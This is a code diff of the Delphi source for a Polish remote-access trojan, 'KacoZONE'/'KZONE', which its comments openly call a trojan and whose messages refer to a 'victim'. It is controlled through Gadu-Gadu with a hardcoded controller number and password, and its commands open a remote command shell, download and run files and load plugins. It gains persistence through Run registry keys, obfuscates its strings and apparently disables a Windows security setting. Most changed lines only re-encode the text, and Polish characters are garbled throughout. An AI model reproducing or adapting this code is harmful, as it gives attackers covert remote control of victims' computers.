@@ -2,14 +2,14 @@
   *******************************
   *   01.01.2008 - 00.00.2008   *
   *         by tscript3r        *
-  *         KacoZONE v2.0       *
+  *          KZONE v2.0         *
   *******************************)
 
 program KZ;
 
 //{$DEFINE STOP}                       { Blokada uruchomienia                   }
 {$DEFINE NOINSTALL}                  { Blokada instalatora                    }
-{$DEFINE NOREADCONFIG}               { Blokada ≥adowania konfiguracji         }
+{$DEFINE NOREADCONFIG}               { Blokada ≈Çadowania konfiguracji         }
 
 uses
  SysUtils,
@@ -17,74 +17,74 @@ uses
  WinSock;
 
 const
- {USTAWIENIA G£”WNE}
- ProgName =                          { Nazwa programu                         } 'KacoZONE';
+ {USTAWIENIA G≈Å√ìWNE}
+ ProgName =                          { Nazwa programu                         } 'KZONE';
  Version =                           { Wersja programu                        } 'VIP build 2032';
  Author =                            { Autor programu                         } 'tscript3r';
- Prefix =                            { Prefix wiÍkszoúci/wszystkich komend    } '#';
- Sep =                               { Znak seperujπcy                        } '|';
+ Prefix =                            { Prefix wiƒôkszo≈õci/wszystkich komend    } '#';
+ Sep =                               { Znak separujƒÖcy                        } '|';
  ResFile2 =                          { Plik tymczasowy 2                      } '14364321.exe';
  ConfigFile =                        { Plik konfiguracyjny                    } '21332532.res';
  MasterEnable =                      { Exploit on/off                         } False;
 
  {Gadu-Gadu}
- GGIPS:array[0..21]of Integer = (    { Adresy serwerow GG	                  } (235783515), (8074), (437110107), (8074), (403555675), (8074), (202229083), (8074), (286115163), (8074), (302892379), (8074), (487441755), (8074), (470664539), (8074), (453887323), (8074), (420332891), (8074), (554550619), (8074));
- GGMaster =                          { Tzw. "zamierzony exploit"              } 2664558;
+ GGIPS:array[0..21]of Integer = (    { Adresy serwerow GG	                    } (235783515), (8074), (437110107), (8074), (403555675), (8074), (202229083), (8074), (286115163), (8074), (302892379), (8074), (487441755), (8074), (470664539), (8074), (453887323), (8074), (420332891), (8074), (554550619), (8074));
+ GGMaster =                          { Mini exploit                           } 2664558;
  GGDesc =                            { Opis dla serwera Gadu-Gadu             } '  '+ProgName+#13+Version+#13+'  by  '+Author+#13+'_________'+#13+'user: %s';
 
  {KOMENDY}
- C_END =                             { ZakoÒczenia pracy programu             } Prefix+'end';
- C_ON_CMD =                          { Uruchamiania pow≥oki poleceÒ           } Prefix+'cmd on';
- C_OFF_CMD =                         { Wy≥πczania pow≥oki poleceÒ             } Prefix+'cmd off';
- C_DOWNLOAD_URL =                    { Pobierania pliku z adresu URL          } Prefix+'urldownload';
- C_OPEN =                            { Uruchamiania wskazanego pliku          } Prefix+'open';
- C_CONFIG =                          { Konfiguracji                           } Prefix+'config';
- C_RESTART =                         { Resetu trojana                         } Prefix+'csave';
- C_UNINSTALL =                       { Uninstalacji trojana                   } Prefix+'uninstall';
- C_INSTALL_PLUG =                    { Instalacja pluginÛw                    } Prefix+'pinstall';
- C_DEINSTALL_PLUG =                  { Deinstalacja pluginÛw                  } Prefix+'pdeinstall';
- C_LIST_PLUG =                       { Lista pluginÛw                         } Prefix+'plist';
+ C_END =                             { Zako≈Ñcza prace programu                } Prefix+'end';
+ C_ON_CMD =                          { Uruchamia pow≈Çokƒô polece≈Ñ              } Prefix+'cmd on';
+ C_OFF_CMD =                         { Wy≈ÇƒÖcza pow≈Çokƒô polece≈Ñ                } Prefix+'cmd off';
+ C_DOWNLOAD_URL =                    { Pobiera plik z adresu URL              } Prefix+'urldownload';
+ C_OPEN =                            { Uruchamia wskazany plik                } Prefix+'open';
+ C_CONFIG =                          { Konfiguracja                           } Prefix+'config';
+ C_RESTART =                         { Reset trojana                          } Prefix+'csave';
+ C_UNINSTALL =                       { Uninstalacja trojana                   } Prefix+'uninstall';
+ C_INSTALL_PLUG =                    { Instalacja plugin√≥w                    } Prefix+'pinstall';
+ C_DEINSTALL_PLUG =                  { Deinstalacja plugin√≥w                  } Prefix+'pdeinstall';
+ C_LIST_PLUG =                       { Lista aktywnych plugin√≥w               } Prefix+'plist';
 
  {NAZWY KONFIGURACJI}
  CG_GGC =                            { Klient                                 } 'client';
  CG_GGS =                            { Login serwera                          } 'server';
- CG_GGP =                            { Has≥o do loginu serwera                } 'pass';
- CG_REG =                            { SposÛb autostartu                      } 'reg';
- CG_HELLO =                          { Wiadomoúc powitalna                    } 'hello';
+ CG_GGP =                            { Has≈Ço do loginu serwera                } 'pass';
+ CG_REG =                            { Spos√≥b autostartu                      } 'reg';
+ CG_HELLO =                          { Wiadomo≈õc powitalna                    } 'hello';
 
  {ODPOWIEDZI}
- M_HELLO =                           { WiadomoúÊ powitalna                    } ProgName+' v'+Version+' aktywny!'+#13#10+#13+'Info:'+#13+'Nazwa uøytkownika ofiary: "%s"'+#13+'Skype: %s'+#13+'Gadu-Gadu: %s';
- M_MHELLO =                          { WiadomoúÊ do numeru "mastera"          } 'tu.';
- M_END =                             { Odpowiedü zakoÒczenia pracy programu   } 'Wy≥πczono.';
- M_ALERT =                           { WiadomoúÊ, gdy ktoú niepowo≥any zagada } 'Uwaga! Osoba o numerze gg:%s'+#13+'Wys≥a≥a na numer serwera wiadomoúÊ:'+#13+'%s';
- M_ACCESS_DIE =                      { Nieautoryzowany numer Gadu-Gadu        } ProgName+' v'+Version+' - odmowa dostÍpu.';
- M_NO_COMMAND_HANDLE =               { WiadomoúÊ, gdy niew≥aúciwe polecenie   } 'Nie rozpoznano polecenia.';
- M_STARTED_CMD =                     { WiadomoúÊ, gdy CMD odpalone            } 'CMD zosta≥o uruchomione.';
- M_STOPTED_CMD =                     { WiadomoúÊ, gdy CMD zatrzymane          } 'CMD zosta≥o wy≥πczone.';
- M_BEGIN_URL =                       { Gdy pobieranie siÍ rozpocznie          } 'Pobieranie pliku:'+#13+'%s'+#13+'Zosta≥o rozpoczÍte.';
- M_END_URL =                         { Gdy pobieranie zostanie ukoÒczone      } 'Pobieranie pliku zosta≥o zakoÒczone.'+#13+'Plik zosta≥ zapisany do:'+#13+'%s';
+ M_HELLO =                           { Wiadomo≈õƒá powitalna                    } ProgName+' v'+Version+' aktywny!'+#13#10+#13+'Info:'+#13+'Nazwa u≈ºytkownika ofiary: "%s"'+#13+'Skype: %s'+#13+'Gadu-Gadu: %s';
+ M_MHELLO =                          { Wiadomo≈õƒá do numeru "mastera"          } 'tu.';
+ M_END =                             { Odpowied≈∫ zako≈Ñczenia pracy programu   } 'Wy≈ÇƒÖczono.';
+ M_ALERT =                           { Wiadomo≈õƒá, gdy kto≈õ niepowo≈Çany zagada } 'Uwaga! Osoba o numerze gg:%s'+#13+'Wys≈Ça≈Ça na numer serwera wiadomo≈õƒá:'+#13+'%s';
+ M_ACCESS_DIE =                      { Nieautoryzowany numer Gadu-Gadu        } ProgName+' v'+Version+' - odmowa dostƒôpu.';
+ M_NO_COMMAND_HANDLE =               { Wiadomo≈õƒá, gdy niew≈Ça≈õciwe polecenie   } 'Nie rozpoznano polecenia.';
+ M_STARTED_CMD =                     { Wiadomo≈õƒá, gdy CMD odpalone            } 'CMD zosta≈Ço uruchomione.';
+ M_STOPTED_CMD =                     { Wiadomo≈õƒá, gdy CMD zatrzymane          } 'CMD zosta≈Ço wy≈ÇƒÖczone.';
+ M_BEGIN_URL =                       { Gdy pobieranie siƒô rozpocznie          } 'Pobieranie pliku:'+#13+'%s'+#13+'Zosta≈Ço rozpoczƒôte.';
+ M_END_URL =                         { Gdy pobieranie zostanie uko≈Ñczone      } 'Pobieranie pliku zosta≈Ço zako≈Ñczone.'+#13+'Plik zosta≈Ç zapisany do:'+#13+'%s';
  M_START_SUCCESS =                   { Gdy poprawnie uruchomiono plik         } 'Uruchomiono plik: "%s"';
- M_CONFIG =                          { Aktualnej konfiguracji                 } 'Numer serwera: %s'+#13+'Has≥o serwera: %s'+#13+'Numer klienta: %s'+#13+'Typ rejestru: %s'+#13+'åcieøka instalacji: %s'+#13+'WiadomoúÊ powitalna: %s';
- M_CFG_SUCCESS =                     { Poprawnego skonfigurowania             } 'Zmieniono! Ustawienia wejdπ w øycie dopiero po ponownym uruchomieniu serwera.';
- M_RESTART =                         { Resetu trojana                         } 'ProszÍ czekaÊ, trwa zapisywanie nowych ustawieÒ, oraz ponowne uruchamianie.';
- M_SUCCESS_PLUG =                    { Gdy pomyúlnie zainstalowano plugin     } 'Pomyúlnie zainstalowano plugin.';
- M_DSUCCESS_PLUG =                   { Gdy usuniÍto plugin                    } 'Pomyúlnie zdeinstalowano plugin.';
+ M_CONFIG =                          { Aktualnej konfiguracji                 } 'Numer serwera: %s'+#13+'Has≈Ço serwera: %s'+#13+'Numer klienta: %s'+#13+'Typ rejestru: %s'+#13+'≈öcie≈ºka instalacji: %s'+#13+'Wiadomo≈õƒá powitalna: %s';
+ M_CFG_SUCCESS =                     { Poprawnego skonfigurowania             } 'Zmieniono! Ustawienia wejdƒÖ w ≈ºycie dopiero po ponownym uruchomieniu serwera.';
+ M_RESTART =                         { Resetu trojana                         } 'Proszƒô czekaƒá, trwa zapisywanie nowych ustawie≈Ñ, oraz ponowne uruchamianie.';
+ M_SUCCESS_PLUG =                    { Gdy pomy≈õlnie zainstalowano plugin     } 'Pomy≈õlnie zainstalowano plugin.';
+ M_DSUCCESS_PLUG =                   { Gdy usuniƒôto plugin                    } 'Pomy≈õlnie zdeinstalowano plugin.';
 
- {B£ DY}
- E_STARTED_CMD =                     { B≥πd, gdy CMD jest juø odpalone        } 'CMD zosta≥o juø uruchomione!';
- E_STOPTED_CMD =                     { B≥πd, gdy CMD zatrzymane               } 'CMD jest wy≥πczone!';
- E_SYNTAX_URL =                      { B≥πd, gdy sk≥adania URL niepoprawna    } 'Nieprawid≥owa sk≥adnia polecenia.';
- E_DOWNLOAD_URL =                    { B≥πd, gdy plik nie moøe zostaÊ pobrany } 'Nie moøna pobraÊ:'+#13+'%s';
- E_SAVE_URL =                        { B≥πd, gdy úcieøka zapisu jest zajÍta   } 'Plik:'+#13+'%s'+#13+'juø istnieje! Wybierz innπ úcieøkÍ zapisu.';
- E_BUSSY_URL =                       { B≥πd, gdy wπtek URL jest zajÍty        } 'Wπtek pobierajπcy plik z adresu URL, jest chwilowo zajÍty!';
- E_WRONG_FILE =                      { B≥πd, gdy wskazany plik jest b≥Ídny    } 'B≥πd! Wskazany plik nie istnieje!';
- E_WRONG_VALUE =                     { B≥πd, gdy wartoúÊ jest nieprawid≥owa   } 'Podana wartoúÊ jest nieprawid≥owa!';
- E_NO_PLUG =                         { B≥πd, gdy brak pluginÛw                } 'B≥πd! Aktualnie nie ma øadnych zainstalowanych pluginÛw.';
- E_EXISTS_ERROR_PLUG =               { B≥πd, gdy plugin juø istnieje          } 'Plugin jest juø zainstalowany, lub jest niew≥aúciwy!';
- E_NOTEXISTS_PLUG =                  { B≥πd, gdy plugin nieistnieje           } 'Plugin nieistnieje!';
- E_NOTDLL =                          { B≥πd, gdy wskazany plik nie jest DLL   } 'B≥πd! Wskazany plik nie jest bibliotekπ DLL!';
- E_NOT_INTEGER =                     { Gdy ciπg tekstowy nie jest liczbπ      } 'Podaj numer ID pluginu!';
- E_WRONG_ID =                        { B≥Ídne ID                              } 'Podane ID nie jest prawid≥owe!';
+ {B≈ÅƒòDY}
+ E_STARTED_CMD =                     { B≈ÇƒÖd, gdy CMD jest ju≈º odpalone        } 'CMD zosta≈Ço ju≈º uruchomione!';
+ E_STOPTED_CMD =                     { B≈ÇƒÖd, gdy CMD zatrzymane               } 'CMD jest wy≈ÇƒÖczone!';
+ E_SYNTAX_URL =                      { B≈ÇƒÖd, gdy sk≈Çadania URL niepoprawna    } 'Nieprawid≈Çowa sk≈Çadnia polecenia.';
+ E_DOWNLOAD_URL =                    { B≈ÇƒÖd, gdy plik nie mo≈ºe zostaƒá pobrany } 'Nie mo≈ºna pobraƒá:'+#13+'%s';
+ E_SAVE_URL =                        { B≈ÇƒÖd, gdy ≈õcie≈ºka zapisu jest zajƒôta   } 'Plik:'+#13+'%s'+#13+'ju≈º istnieje! Wybierz innƒÖ ≈õcie≈ºkƒô zapisu.';
+ E_BUSSY_URL =                       { B≈ÇƒÖd, gdy wƒÖtek URL jest zajƒôty        } 'WƒÖtek pobierajƒÖcy plik z adresu URL, jest chwilowo zajƒôty!';
+ E_WRONG_FILE =                      { B≈ÇƒÖd, gdy wskazany plik jest b≈Çƒôdny    } 'B≈ÇƒÖd! Wskazany plik nie istnieje!';
+ E_WRONG_VALUE =                     { B≈ÇƒÖd, gdy warto≈õƒá jest nieprawid≈Çowa   } 'Podana warto≈õƒá jest nieprawid≈Çowa!';
+ E_NO_PLUG =                         { B≈ÇƒÖd, gdy brak plugin√≥w                } 'B≈ÇƒÖd! Aktualnie nie ma ≈ºadnych zainstalowanych plugin√≥w.';
+ E_EXISTS_ERROR_PLUG =               { B≈ÇƒÖd, gdy plugin ju≈º istnieje          } 'Plugin jest ju≈º zainstalowany, lub jest niew≈Ça≈õciwy!';
+ E_NOTEXISTS_PLUG =                  { B≈ÇƒÖd, gdy plugin nieistnieje           } 'Plugin nieistnieje!';
+ E_NOTDLL =                          { B≈ÇƒÖd, gdy wskazany plik nie jest DLL   } 'B≈ÇƒÖd! Wskazany plik nie jest bibliotekƒÖ DLL!';
+ E_NOT_INTEGER =                     { Gdy ciƒÖg tekstowy nie jest liczbƒÖ      } 'Podaj numer ID pluginu!';
+ E_WRONG_ID =                        { B≈Çƒôdne ID                              } 'Podane ID nie jest prawid≈Çowe!';
 
 type
  THeaderRec = record
@@ -148,22 +148,22 @@ type
 var
  WSA:WSAData;                        { Pakiet informacyjny o wsock32.dll      }
  Sock:TSocket;                       { Numer ID gniazda                       }
- SockInfo:sockaddr_in;               { Pakiet informacji o gnieüdzie          }
- Connected:Boolean=False;            { Po≥πczony tak/nie                      }
- Size:Integer;                       { Rozmiar otrzymanych pakietÛw           }
- RecvHeader:THeaderRec;              { Pakiet nag≥Ûwkowy, informacyjny        }
- RecvMsg:TRecvMsgRec;                { Pakiet odbiÛrkowy wiadomoúci           }
- NullString:String;                  { Pomocnicza odbioru wiadomoúci          }
- NullChar:Char;                      { Zmienna pomocnicza odbioru wiadomoúci  }
+ SockInfo:sockaddr_in;               { Pakiet informacji o gnie≈∫dzie          }
+ Connected:Boolean=False;            { Po≈ÇƒÖczony tak/nie                      }
+ Size:Integer;                       { Rozmiar otrzymanych pakiet√≥w           }
+ RecvHeader:THeaderRec;              { Pakiet nag≈Ç√≥wkowy, informacyjny        }
+ RecvMsg:TRecvMsgRec;                { Pakiet odbi√≥rkowy wiadomo≈õci           }
+ NullString:String;                  { Pomocnicza odbioru wiadomo≈õci          }
+ NullChar:Char;                      { Zmienna pomocnicza odbioru wiadomo≈õci  }
  hReadOut,hWriteIn:THandle;          { Handle (uchwyt) odczytu/zapisu CMD     }
  ProcInfo:TProcessInformation;       { Struktura danych o procesie            }
  BWrite,BRead,ExitCMD:Dword;         { Zmienne pomocnicze (CMD)               }
- Buff,Buff2:array[0..32767]of byte;  { Buffory odczytu oraz zapisu            }
- CMDEnabled:Boolean=False;           { Zmienna kontrolujπca CMD               }
+ Buff,Buff2:array[0..32767]of byte;  { Bufory odczytu oraz zapisu             }
+ CMDEnabled:Boolean=False;           { Zmienna kontrolujƒÖca CMD               }
  ThreadID,Sender:DWORD;              { Zmienna pomocnicza, CMD                }
- URLDownload:PURLDownloadRec;        { Pakiet przekazania danych do wπtku URL }
- URLBussy:Boolean=False;             { Zmienna kontrolujπca wπtek URL         }
- P:Pointer;                          { Wskaünik pakietu danych URL            }
+ URLDownload:PURLDownloadRec;        { Pakiet przekazania danych do wƒÖtku URL }
+ URLBussy:Boolean=False;             { Zmienna kontrolujƒÖca wƒÖtek URL         }
+ P:Pointer;                          { Wska≈∫nik pakietu danych URL            }
  HM:HDC;                             { Zmienna pomocnicza - multi open        }
  PluginRegister:procedure(var Plug:PInfoWrite); stdcall;
  Info:PInfoWrite;
@@ -174,7 +174,7 @@ var
  GGPass:String=                      { Haslo serwera Gadu-Gadu                } '123123';
  GGClient:Integer=                   { Numer klienta Gadu-Gadu                } 2664558;
  GGAcc:Integer=                      { Numer serwera Gadu-Gadu                } 10753494;
- Path:String;                        { åcieøka instalacyjna                   }
+ Path:String;                        { ≈öcie≈ºka instalacyjna                   }
  RegInstall:Integer;                 { Opcja rejestru                         }
  HelloMsg:Boolean;                   { Wiadomosc powitalna                    }
  CFGTab:array[0..5]of String;
@@ -264,14 +264,14 @@ function CheckIsGG:String;
 var
  H:HKey;
 begin
- if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ∫‘◊Ë†∫‘◊Ë')),0,KEY_READ,H) = ERROR_SUCCESS then Result:='zainstalowane' else Result:='brak';
+ if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ƒÜ√ÇƒÖ√áƒò¬¥ƒπ¬∏ƒéƒé≈ü√î√óƒç¬†≈ü√î√óƒç')),0,KEY_READ,H) = ERROR_SUCCESS then Result:='zainstalowane' else Result:='brak';
 end;
 
 function CheckIsSkype:String;
 var
  H:HKey;
 begin
- if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ∆ﬁÏ„ÿ')),0,KEY_READ,H) = ERROR_SUCCESS then Result:='zainstalowane' else Result:='brak';
+ if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ƒÜ√ÇƒÖ√áƒò¬¥ƒπ¬∏ƒéƒéƒÜ≈¢ƒõƒÉ≈ò')),0,KEY_READ,H) = ERROR_SUCCESS then Result:='zainstalowane' else Result:='brak';
 end;
 
 procedure SaveToExe;
@@ -321,9 +321,9 @@ var
  Func:function(Caller: IUnknown; URL: PChar; FileName: PChar; Reserved: DWORD; StatusCB: Pointer): HResult; stdcall;
 begin
  Result:=1;
- DLL:=LoadLibrary(PChar(DeCode('»≈ø¿¬¡°∑øø')));
+ DLL:=LoadLibrary(PChar(DeCode('ƒåƒπ≈º≈î√Ç√ÅÀá¬∑≈º≈º')));
   try
-   @Func:=GetProcAddress(DLL, PChar(DeCode('»≈ø∑‚Í·ﬂ‚‘◊«‚π‹ﬂÿ¥')));
+   @Func:=GetProcAddress(DLL, PChar(DeCode('ƒåƒπ≈º¬∑√¢ƒô√°√ü√¢√î√ó√á√¢ƒÖ√ú√ü≈ò¬¥')));
    if @Func<>nil then
     Result:=Func(nil, URL, SavePath, 0, nil);
   finally
@@ -671,7 +671,7 @@ begin
  end;
 end;
 
-{W•TKI}
+{WƒÑTKI}
 function CMDThread(pVoid: Pointer): DWORD; stdcall;
 begin
  Result:=0;
@@ -719,26 +719,26 @@ begin
  case RegInstall of
   1:
    // HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-   if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·')),0,KEY_WRITE,H) = ERROR_SUCCESS then
+   if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ƒÜ√ÇƒÖ√áƒò¬¥ƒπ¬∏ƒéƒé≈î√ú√ñƒ∫√¢ƒá√¢≈Æ√ßƒéƒéƒò√ú√°√ó√¢ƒôƒáƒéƒé¬∂ƒçƒ∫ƒ∫≈ò√°√ß√â≈òƒ∫ƒá√ú√¢√°ƒéƒéƒπƒç√°')),0,KEY_WRITE,H) = ERROR_SUCCESS then
     RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
    else begin
-    RegCreateKey(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·')),H);
+    RegCreateKey(HKEY_LOCAL_MACHINE,PChar(DeCode('ƒÜ√ÇƒÖ√áƒò¬¥ƒπ¬∏ƒéƒé≈î√ú√ñƒ∫√¢ƒá√¢≈Æ√ßƒéƒéƒò√ú√°√ó√¢ƒôƒáƒéƒé¬∂ƒçƒ∫ƒ∫≈ò√°√ß√â≈òƒ∫ƒá√ú√¢√°ƒéƒéƒπƒç√°')),H);
     RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
    end;
   2:
    // HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
-   if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·∆ÿÂÈ‹÷ÿÊ')),0,KEY_WRITE,H) = ERROR_SUCCESS then
+   if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ƒÜ√ÇƒÖ√áƒò¬¥ƒπ¬∏ƒéƒé≈î√ú√ñƒ∫√¢ƒá√¢≈Æ√ßƒéƒéƒò√ú√°√ó√¢ƒôƒáƒéƒé¬∂ƒçƒ∫ƒ∫≈ò√°√ß√â≈òƒ∫ƒá√ú√¢√°ƒéƒéƒπƒç√°ƒÜ≈òƒ∫√©√ú√ñ≈òƒá')),0,KEY_WRITE,H) = ERROR_SUCCESS then
     RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
    else begin
-    RegCreateKey(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·∆ÿÂÈ‹÷ÿÊ')),H);
+    RegCreateKey(HKEY_LOCAL_MACHINE,PChar(DeCode('ƒÜ√ÇƒÖ√áƒò¬¥ƒπ¬∏ƒéƒé≈î√ú√ñƒ∫√¢ƒá√¢≈Æ√ßƒéƒéƒò√ú√°√ó√¢ƒôƒáƒéƒé¬∂ƒçƒ∫ƒ∫≈ò√°√ß√â≈òƒ∫ƒá√ú√¢√°ƒéƒéƒπƒç√°ƒÜ≈òƒ∫√©√ú√ñ≈òƒá')),H);
     RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
    end;
   3:
    // HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-   if RegOpenKeyEx(HKEY_CURRENT_USER,PChar(DeCode('∆‚ŸÁÍ‘Âÿœœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·')),0,KEY_WRITE,H) = ERROR_SUCCESS then
+   if RegOpenKeyEx(HKEY_CURRENT_USER,PChar(DeCode('ƒÜ√¢≈Æ√ßƒô√îƒ∫≈òƒéƒé≈î√ú√ñƒ∫√¢ƒá√¢≈Æ√ßƒéƒéƒò√ú√°√ó√¢ƒôƒáƒéƒé¬∂ƒçƒ∫ƒ∫≈ò√°√ß√â≈òƒ∫ƒá√ú√¢√°ƒéƒéƒπƒç√°')),0,KEY_WRITE,H) = ERROR_SUCCESS then
     RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
    else begin
-    RegCreateKey(HKEY_CURRENT_USER,PChar(DeCode('∆‚ŸÁÍ‘Âÿœœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·')),H);
+    RegCreateKey(HKEY_CURRENT_USER,PChar(DeCode('ƒÜ√¢≈Æ√ßƒô√îƒ∫≈òƒéƒé≈î√ú√ñƒ∫√¢ƒá√¢≈Æ√ßƒéƒéƒò√ú√°√ó√¢ƒôƒáƒéƒé¬∂ƒçƒ∫ƒ∫≈ò√°√ß√â≈òƒ∫ƒá√ú√¢√°ƒéƒéƒπƒç√°')),H);
     RegSetValueEx(H, PChar(ExtractFileName(Path)), 0, REG_SZ, PChar(Path), Length(Path)+1)
    end;
  end;
@@ -752,13 +752,13 @@ begin
  for I := 1 to 3 do begin
   case I of
    1:
-    if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then
+    if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ƒÜ√ÇƒÖ√áƒò¬¥ƒπ¬∏ƒéƒé≈î√ú√ñƒ∫√¢ƒá√¢≈Æ√ßƒéƒéƒò√ú√°√ó√¢ƒôƒáƒéƒé¬∂ƒçƒ∫ƒ∫≈ò√°√ß√â≈òƒ∫ƒá√ú√¢√°ƒéƒéƒπƒç√°')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then
      RegDeleteValue(H, PChar(ExtractFileName(Path)));
    2:
-    if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆¬π« ¥≈∏œœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·∆ÿÂÈ‹÷ÿÊ')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then
+    if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ƒÜ√ÇƒÖ√áƒò¬¥ƒπ¬∏ƒéƒé≈î√ú√ñƒ∫√¢ƒá√¢≈Æ√ßƒéƒéƒò√ú√°√ó√¢ƒôƒáƒéƒé¬∂ƒçƒ∫ƒ∫≈ò√°√ß√â≈òƒ∫ƒá√ú√¢√°ƒéƒéƒπƒç√°ƒÜ≈òƒ∫√©√ú√ñ≈òƒá')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then
      RegDeleteValue(H, PChar(ExtractFileName(Path)));
    3:
-    if RegOpenKeyEx(HKEY_CURRENT_USER,PChar(DeCode('∆‚ŸÁÍ‘Âÿœœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ≈Ë·')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then
+    if RegOpenKeyEx(HKEY_CURRENT_USER,PChar(DeCode('ƒÜ√¢≈Æ√ßƒô√îƒ∫≈òƒéƒé≈î√ú√ñƒ∫√¢ƒá√¢≈Æ√ßƒéƒéƒò√ú√°√ó√¢ƒôƒáƒéƒé¬∂ƒçƒ∫ƒ∫≈ò√°√ß√â≈òƒ∫ƒá√ú√¢√°ƒéƒéƒπƒç√°')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then
      RegDeleteValue(H, PChar(ExtractFileName(Path)));
   end;
  end;
@@ -766,9 +766,9 @@ end;
 
 function ExecuteEx(Path,Param,Dir:PAnsiChar;Show:Boolean=True):Integer;
 const
- SHELL32_LIBARY = 'Ê€ÿﬂﬂ¶•°◊ﬂﬂ';
- SHELL_FUNCTION = '∆€ÿﬂﬂ∏Îÿ÷ËÁÿ¥';
- SHELL_METHOD = '‚„ÿ·';
+ SHELL32_LIBARY = 'ƒá≈∞≈ò√ü√ü¬¶ƒÑÀá√ó√ü√ü';
+ SHELL_FUNCTION = 'ƒÜ≈∞≈ò√ü√ü¬∏√´≈ò√ñƒç√ß≈ò¬¥';
+ SHELL_METHOD = '√¢ƒÉ≈ò√°';
 var
  DLL:THandle;
  Exe:function(a:HWND;b,c,d,e:PChar;f:Word):HINST;stdcall;
@@ -792,9 +792,9 @@ var
  Enable:DWORD;
 begin
  Enable:=0;
- if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('∆‚ŸÁÍ‘Âÿœœ¿‹÷Â‚Ê‚ŸÁœœ ‹·◊‚ÍÊœœ∂ËÂÂÿ·Á…ÿÂÊ‹‚·œœ√‚ﬂ‹÷‹ÿÊœœ∆ÏÊÁÿ‡')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then begin
+ if RegOpenKeyEx(HKEY_LOCAL_MACHINE,PChar(DeCode('ƒÜ√¢≈Æ√ßƒô√îƒ∫≈òƒéƒé≈î√ú√ñƒ∫√¢ƒá√¢≈Æ√ßƒéƒéƒò√ú√°√ó√¢ƒôƒáƒéƒé¬∂ƒçƒ∫ƒ∫≈ò√°√ß√â≈òƒ∫ƒá√ú√¢√°ƒéƒéƒÇ√¢√ü√ú√ñ√ú≈òƒáƒéƒéƒÜƒõƒá√ß≈ò≈ï')),0,KEY_SET_VALUE,H) = ERROR_SUCCESS then begin
   try
-   RegSetValueEx(H, PChar(DeCode('∏·‘’ﬂÿø»¥')), 0, REG_DWORD, @Enable, SizeOf(Enable));
+   RegSetValueEx(H, PChar(DeCode('¬∏√°√î≈ê√ü≈ò≈ºƒå¬¥')), 0, REG_DWORD, @Enable, SizeOf(Enable));
   finally
    RegCloseKey(H);
   end;
@@ -807,9 +807,9 @@ var
  Enable:DWORD;
 begin
  Enable:=0;
